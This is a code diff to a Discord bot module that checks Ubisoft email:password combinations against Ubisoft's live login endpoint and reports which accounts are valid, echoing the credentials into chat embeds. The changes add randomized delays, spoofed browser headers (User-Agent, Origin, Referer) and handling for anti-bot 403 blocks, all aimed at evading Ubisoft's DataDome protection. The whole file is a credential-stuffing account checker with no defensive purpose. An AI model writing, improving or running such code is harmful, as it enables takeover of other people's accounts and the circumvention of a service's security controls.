@@ -5,8 +5,9 @@ import aiohttp
 import base64
 import utils
 import database as db
+import asyncio
+import random
 
-# Ubisoft App ID
 UBI_APP_ID = "314d4fef-e568-454a-ae06-43e3bece12a6"
 
 class Checker(commands.Cog):
@@ -34,18 +35,24 @@ class Checker(commands.Cog):
         email, password = account.split(":", 1)
         b64_auth = base64.b64encode(f"{email}:{password}".encode('utf-8')).decode('utf-8')
         
+        await asyncio.sleep(random.uniform(1.0, 3.0))
+
         headers = {
             "Content-Type": "application/json",
             "Ubi-AppId": UBI_APP_ID,
             "Authorization": f"Basic {b64_auth}",
-            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
+            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
+            "Accept": "application/json",
+            "Accept-Language": "en-US,en;q=0.9",
+            "Origin": "https://account.ubisoft.com",
+            "Referer": "https://account.ubisoft.com/"
         }
 
         embed = discord.Embed(color=0x5865F2, title="🔍 Account Check", description=f"**User:** {interaction.user.mention}\n**Type:** Ubisoft Email:Pass\n**Input:** `{account}`")
         
         try:
             async with aiohttp.ClientSession() as session:
-                async with session.post("https://public-ubiservices.ubi.com/v3/profiles/sessions", headers=headers, json={"rememberMe": True}, timeout=5) as res:
+                async with session.post("https://public-ubiservices.ubi.com/v3/profiles/sessions", headers=headers, json={"rememberMe": True}, timeout=10) as res:
                     if res.status == 200:
                         embed.color = 0x57F287
                         embed.add_field(name="Status", value="✅ Valid")
@@ -54,6 +61,10 @@ class Checker(commands.Cog):
                         embed.color = 0xED4245
                         embed.add_field(name="Status", value="❌ Invalid / 2FA")
                         await interaction.followup.send("❌ Account is dead or requires 2FA.", ephemeral=True)
+                    elif res.status == 403:
+                        embed.color = 0xED4245
+                        embed.add_field(name="Status", value="🚫 DataDome Blocked (IP banned)")
+                        await interaction.followup.send("🚫 **403 Blocked:** Ubisoft's anti-bot blocked the server's IP.", ephemeral=True)
                     else:
                         embed.color = 0xFEE75C
                         embed.add_field(name="Status", value=f"⚠️ Error {res.status}")
@@ -70,7 +81,6 @@ class Checker(commands.Cog):
     async def checkprelink(self, interaction: discord.Interaction, console: str, details: str):
         await interaction.response.defer(ephemeral=True)
         
-        # Log to channel (manual check)
         embed = discord.Embed(
             color=0x5865F2, 
             title="🎮 Pre-Linked Check",
